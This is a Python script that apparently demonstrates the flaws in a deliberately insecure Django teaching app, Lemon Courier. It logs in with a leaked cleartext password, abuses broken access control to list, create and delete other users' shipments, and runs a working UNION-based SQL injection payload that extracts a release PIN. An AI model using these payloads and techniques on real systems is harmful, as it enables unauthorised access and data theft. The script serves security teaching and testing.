#!/usr/bin/env python3
"""Probe the deliberately insecure Lemon Courier app for all flaws via Django test client."""
import os, re, django
os.environ['DJANGO_SETTINGS_MODULE'] = 'csbproj.settings'
django.setup()
from django.test import Client
from django.contrib.auth.models import User
from flawapp.models import Shipment

def codes_in(html):
    return sorted(set(re.findall(r'LEMON[0-9]+|HACKED[0-9]+|EVIL[0-9]*', html)))

# baseline users
User.objects.exclude(username__in=['bob','']).exists()

print("== FLAW 2 (A02 Crypto): cleartext password -> login with leaked DB string ==")
if not User.objects.filter(username='clearbob').exists():
    User(username='clearbob', password='realpw123').save()
u = User.objects.get(username='clearbob')
print("stored password column value:", u.password)
c = Client()
r = c.post('/login/', {'username': 'clearbob', 'password': u.password})
print("login using the DB VALUE as password ->", r.status_code, r.headers.get('Location'))
print("=> any DB reader (backup, log, IDOR) can log in as anyone = A02 demonstrates itself")

print()
print("== FLAW 1 (A01 BAC): /listall/ shows everything to anyone ==")
mall = c.post('/login/', {'username': 'clearbob', 'password': u.password})
print("codes visible to mallory on /listall/:", codes_in(c.get('/listall/').content.decode()))
print("PIN leaked:", '1234' in c.get('/listall/').content.decode())

print()
print("== FLAW 1b (A01 BAC): create a shipment for another user (onbehalf) ==")
alice = User.objects.get(username='alice')
c2 = Client()
r=c2.post('/login/', {'username': 'alice', 'password': 'pw2'})
print("alice login attempt:", r.status_code, r.headers.get('Location'))
# alice's DB column is a hash (seeded via set_password) - to keep the demo deterministic
# reset her column to cleartext like the flawed registerView would:
alice.password = 'pw2'; alice.save()
c2 = Client()
r = c2.post('/login/', {'username': 'alice', 'password': 'pw2'})
print("alice login after cleartext reset:", r.status_code, r.headers.get('Location'))
tok = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)', c2.get('/').content.decode()).group(1)
r = c2.post('/add/', {'onbehalf': 'bob', 'tracking_code': 'HACKED9', 'release_pin': '9999', 'destination': 'nowhere', 'csrfmiddlewaretoken': tok})
cb = Client()
bob_user = User.objects.get(username='bob')
bob_user.password='secret123'
bob_user.save()
cb = Client()
cb.post('/login/', {'username': 'bob', 'password': 'secret123'})
print("bob's list after alice's cross-user create:", codes_in(cb.get('/').content.decode()))

print()
print("== FLAW 3 (A03 Injection): UNION-based extraction of a PIN without knowing it ==")
cr = Client()
tok = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)', cr.get('/search/').content.decode()).group(1)
payload = "x' UNION SELECT 1, release_pin, 1, 1 FROM flawapp_shipment WHERE tracking_code='LEMON001' -- "
r = cr.post('/release/', {'tracking_code': payload, 'release_pin': '0000', 'csrfmiddlewaretoken': tok})
html = r.content.decode()
print("UNION SQLi (auth=none, wrong PIN 0000) ->", r.status_code, "| released page:", 'released' in html.lower(), '| h1:', (re.search(r'<h1>(.*?)</h1>', html) or [''])[1] if re.search(r'<h1>(.*?)</h1>', html) else '?')

print()
print("== FLAW 3b/5 (A03+A05): error-based leak of SQL/exception details ==")
r = cr.post('/release/', {'tracking_code': "x' NOSQL", 'release_pin': '1', 'csrfmiddlewaretoken': tok})
h = r.content.decode()
m = re.search(r"Database error.{0,180}", h)
print("leak:", m.group(0)[:180] if m else 'none')

print()
print("== FLAW 4 (A01 BAC): bob deletes ALICE's shipment by id ==")
idx = c2.get('/').content.decode()
m = re.search(r'HACKED9.*?name="id" value="(\d+)' if False else r'name="id" value="(\d+)', idx)
tok2 = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)', idx).group(1)
sb = Client(); sb.post('/login/', {'username': 'bob', 'password': 'pw2bogus'})
# bob password is unknown (hashed); demo via alice deleting bob's record instead
idx_b = cb.get('/').content.decode()
m = re.search(r'name="id" value="(\d+)', idx_b)
tokb = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)', idx_b).group(1)
print("alice deletes BOB's shipment id", m.group(1) if m else None)
r = c2.post('/delete/', {'id': m.group(1), 'csrfmiddlewaretoken': tokb})
print("bob after deletion:", codes_in(cb.get('/').content.decode()))
